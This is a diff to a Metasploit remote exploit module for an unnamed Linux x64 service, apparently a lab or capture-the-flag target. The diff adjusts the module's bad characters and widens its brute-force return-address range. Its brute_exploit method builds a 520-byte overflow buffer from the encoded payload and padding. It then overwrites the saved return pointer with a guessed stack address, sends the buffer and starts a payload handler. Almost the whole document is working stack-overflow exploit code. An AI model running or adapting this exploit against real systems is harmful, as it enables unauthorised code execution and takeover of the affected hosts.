@@ -19,14 +19,14 @@ class MetasploitModule < Msf::Exploit::Remote
                       'Payload' => {
                         'MinNops' => 40,
                         'Space' => 250,
-                        'BadChars' => "\x00\x0A",
+                        'BadChars' => ["\x00" .. "\xF"].to_a.join,
                       },
                       'Targets' => [
                         ['Linux Bruteforce', {
                             'Bruteforce' => {
-                                'Start' => { 'Ret' => 0x7fffffffdbb0},
-                                'Stop'  => { 'Ret' => 0x7fffffffdbf0},
-                                'Step'  => 8
+                                'Start' => { 'Ret' => 0x7fffffffd000},
+                                'Stop'  => { 'Ret' => 0x7fffffffffff},
+                                'Step'  => 40
                             },
                         }]],
                       'DefaultTarget'  => 0,
@@ -42,10 +42,8 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def brute_exploit(addresses)
     connect
-
-    #print_status(addresses.to_s)
     buf = payload.encoded
-    buf += "A" * (520-buf.length)
+    buf += "A"*(520-buf.length)
     buf += [addresses['Ret']].pack('Q')[0..5] # 6 byte long pointer (RET)
     buf += [0,0].pack('cc') # 2 unused bytes that MUST be 0x0000 for RET to be a valid poiner on x64.
 
@@ -55,6 +53,7 @@ class MetasploitModule < Msf::Exploit::Remote
     sock.get_once
 
     handler
+
   end
 
 end
